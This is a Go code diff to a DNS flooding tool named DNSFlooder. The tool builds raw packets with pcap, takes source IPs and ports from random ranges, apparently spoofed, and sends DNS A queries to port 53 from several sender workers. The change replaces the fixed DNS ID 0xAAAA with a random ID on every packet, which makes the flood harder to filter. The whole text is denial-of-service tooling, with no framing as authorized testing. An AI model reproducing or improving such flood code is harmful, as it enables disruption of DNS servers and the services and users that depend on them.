@@ -21,6 +21,7 @@ type DNSFlooder struct {
 	srcIPRange       utils.IPv4Range
 	srcPortRange     utils.RandomUint32Range
 	ipHdrIDGenerator utils.RandomUint32Range
+	dnsIDGenerator   utils.RandomUint32Range
 	dstIP            net.IP
 	srcMAC           net.HardwareAddr
 	dstMAC           net.HardwareAddr
@@ -34,6 +35,7 @@ func NewDNSFlooder(iface *net.Interface, srcIPRange utils.IPv4Range, srcPortRang
 		srcIPRange:       srcIPRange,
 		srcPortRange:     srcPortRange,
 		ipHdrIDGenerator: utils.NewRandomUint32Range(0, 65535),
+		dnsIDGenerator:   utils.NewRandomUint32Range(0, 65535),
 		dstIP:            dstIP,
 		srcMAC:           iface.HardwareAddr,
 		dstMAC:           dstMAC,
@@ -60,9 +62,10 @@ func (d *DNSFlooder) send(idx int) {
 	log.Printf("DNS A query sender #%v started", idx)
 	defer log.Printf("DNS A query sender #%v stoped", idx)
 	// Generators
-	srcPortGenerator := &d.srcPortRange
-	srcIPGenerator := &d.srcIPRange
-	ipHdrIDGenerator := &d.ipHdrIDGenerator
+	srcPortGenerator := d.srcPortRange
+	srcIPGenerator := d.srcIPRange
+	ipHdrIDGenerator := d.ipHdrIDGenerator
+	dnsIDGenerator := d.dnsIDGenerator
 	// Prepare static parts of packet and options
 	serializeOpts := gopacket.SerializeOptions{
 		FixLengths:       true,
@@ -84,10 +87,7 @@ func (d *DNSFlooder) send(idx int) {
 	udpLayer := &layers.UDP{
 		DstPort: layers.UDPPort(53),
 	}
-	dnsLayer := &layers.DNS{
-		ID: 0xAAAA,
-		RD: true,
-	}
+	dnsLayer := &layers.DNS{}
 	// Open device
 	handle, err := pcap.OpenLive(d.netDevice, 65536, false, pcap.BlockForever)
 	if err != nil {
@@ -106,6 +106,7 @@ func (d *DNSFlooder) send(idx int) {
 			udpLayer.SrcPort = layers.UDPPort(srcPortGenerator.Next())
 			udpLayer.SetNetworkLayerForChecksum(ipv4Layer)
 			// Change DNS query
+			dnsLayer.ID = uint16(dnsIDGenerator.Next())
 			dnsLayer.Questions = []layers.DNSQuestion{
 				{
 					Type:  layers.DNSTypeA,
